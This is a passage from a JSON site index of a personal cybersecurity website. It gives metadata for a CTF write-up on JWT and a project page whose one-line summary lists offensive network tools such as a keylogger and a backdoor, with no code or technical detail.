hope you enjoy it :D However bring your coffee cup and let\u0026rsquo;s begin the road .","tags":null,"title":"JWT In A New Way - NCSC 2.0 CTF","type":"post"},{"authors":["Belkahla Ahmed"],"categories":["Cybersecurity"],"content":"","date":1566333101,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1566333101,"objectID":"fb9b05aa559be701b6dc5347a5bc3159","permalink":"https://ahmed-belkahla.me/project/networking-and-security/","publishdate":"2019-08-20T22:31:41+02:00","relpermalink":"/project/networking-and-security/","section":"project","summary":"These are some network and security related tools, including a keylogger, undetectable Backdoor, DNS/ARP spoofer and a file interceptor ","tags":["Cybersecurity"],"title":"Networking and Security Tools","type":"project"}]